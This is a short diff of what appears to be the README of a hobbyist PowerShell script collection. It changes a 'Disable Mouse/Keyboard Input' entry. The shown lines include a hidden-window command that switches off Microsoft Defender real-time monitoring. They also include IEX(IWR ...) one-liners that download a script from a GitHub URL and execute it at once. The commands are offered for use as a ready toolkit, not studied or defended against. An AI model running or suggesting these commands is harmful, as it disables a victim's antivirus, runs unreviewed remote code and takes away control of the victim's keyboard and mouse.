@@ -47,7 +47,7 @@ powershell -w hidden {Set-MpPreference -DisableRealtimeMonitoring $true; Start-S
 ```
 ### Disable Mouse/Keyboard Input - 4 seconds only (Bare with me for Now)
 ```
-IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/testlol.ps1 -UseBasicParsing)
+IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/Dis-Input.ps1 -UseBasicParsing)
 ```
 
 This Page May Have Loads of Error's since I suck at english so avoid em pls lol...
